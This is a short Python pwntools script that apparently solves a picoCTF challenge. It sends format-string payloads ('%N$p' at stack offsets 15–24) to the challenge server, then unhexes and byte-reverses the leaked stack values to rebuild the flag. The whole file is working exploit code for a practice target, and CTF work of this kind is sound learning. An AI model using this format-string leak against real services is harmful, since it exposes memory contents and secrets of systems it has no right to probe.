#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
context.log_level = 'warn'
host, port = 'mercury.picoctf.net', 27912


# =========================================================
#                           FUZZ
# =========================================================

flag = ''

for i in range(15, 25): 
    try:
        # Connect to server
        io = remote(host, port)
        # Format the payload to location on stack
        io.sendlineafter(b'portfolio', b'1')
        io.sendlineafter(b'API token?', f'%{i}$p'.encode())
        # receive unneccesary lines 
        io.recvlines(2)
        # receive leaked
        leak = io.recvline()
        # ignore nulls
        if not b'(nil)' in leak:
            # print value if exist
            print(f'stack at-{i}' + ": " + str(leak))
            try:
                # unhex and decode leaked
                hexform = unhex(leak.split()[0][2:].decode())
                # append to flag and reverse endianess
                flag += hexform.decode()[::-1]
                # confirmation
                print("flag appended")
            except BaseException:
                pass
        io.close()
    except EOFError:
        io.close()

# Print flag
print(f'{flag=}')